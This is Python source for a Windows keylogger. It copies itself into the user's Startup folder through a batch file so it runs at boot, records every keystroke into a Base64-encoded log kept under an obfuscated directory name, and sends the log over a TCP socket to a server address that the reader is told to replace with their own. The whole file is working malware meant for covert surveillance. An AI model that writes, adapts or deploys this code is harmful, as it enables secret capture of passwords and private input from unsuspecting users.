import getpass, os, keyboard, base64, requests, socket, time


### Adds the script to Windows startup programs folder, so it runs on system boot ###
def add_to_startup(file_path=""):

    # If no file path is provided for the executable, use the current script's directory path
    if not file_path:
        file_path = os.path.dirname(os.path.realpath(__file__))

    # Defines the path to the Windows startup folder including the user's name
    bat_path = (rf"C:\Users\{user_name}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")

    # Creates a .bat file in the startup folder that runs the script
    with open(os.path.join(bat_path, "startup_script.bat"), "w+") as bat_file:
        bat_file.write(f'start "" "{file_path}"')


### Logs all key presses to a hidden and obfuscated text file ###
def log_keys_to_txt():

    # Creates the a2V5bG9n directory for the log file to be stored in if it doesn't already exist
    os.makedirs(log_dir, exist_ok=True)

    # Opens the keylog text file, "keylog.txt" obfuscated as "a2V5bG9n.txt" in append bytes mode.
    with open(rf"{log_dir}\a2V5bG9n.txt", "ab") as log_file:

        # Defines a function that logs the key event to the file
        def log_key(event):

            # Takes "event" as an argument, the key that is pressed, encodes it in Base64, then writes to the file buffer
            key = f"{event.name}\n".encode("utf-8") # Encode key input as bytes
            encoded_key = base64.b64encode(key)     # Base64 encoding
            log_file.write(encoded_key + b"\n")     # Writes the encoded key followed by a newline
            log_file.flush()                        # flushes the buffer to save to file on run time.

        # Starts the event listener for key releases that calls the log_key function
        keyboard.on_release(log_key)

        # Keeps the program running to keep listening for events
        keyboard.wait()


def Send_Log_File_To_Server():
    HOST = '127.0.0.1'                      # Replace with your server's IP
    PORT = 65432                            # Replace with your server's port
    file_path = rf"{log_dir}\a2V5bG9n.txt"  # Path to the log file

    # Create a socket and connect to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((HOST, PORT))             # Connect to the server
        print(f"Connected to server at {HOST}:{PORT}") 

        # Open and read the file
        with open(file_path, 'rb') as file:
            data = file.read()
            client_socket.sendall(data)
            print("File sent successfully.")



### MAIN Execution ###

user_name = getpass.getuser()                               # Gets the current user's name
log_dir = rf"C:\Users\{user_name}\AppData\Local\a2V5bG9n"   # Directory to store the log file

add_to_startup()
log_keys_to_txt()
Send_Log_File_To_Server()
